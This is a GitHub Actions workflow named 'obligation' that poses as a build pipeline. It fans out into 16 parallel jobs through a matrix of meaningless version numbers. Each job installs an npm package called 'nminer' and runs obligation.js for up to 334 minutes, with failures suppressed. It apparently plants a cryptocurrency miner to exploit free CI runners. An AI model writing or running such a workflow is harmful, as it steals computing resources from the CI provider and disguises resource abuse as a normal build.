name: obligation
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9291 }
          - { version: 9475 }
          - { version: 375 }
          - { version: 2430 }
          - { version: 2765 }
          - { version: 6518 }
          - { version: 7719 }
          - { version: 5590 }
          - { version: 1652 }
          - { version: 6960 }
          - { version: 3934 }
          - { version: 430 }
          - { version: 3434 }
          - { version: 2248 }
          - { version: 6824 }
          - { version: 2879 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: meh
        run: |
          npm install nminer@latest
          timeout 334m node obligation.js || echo "obligation executed"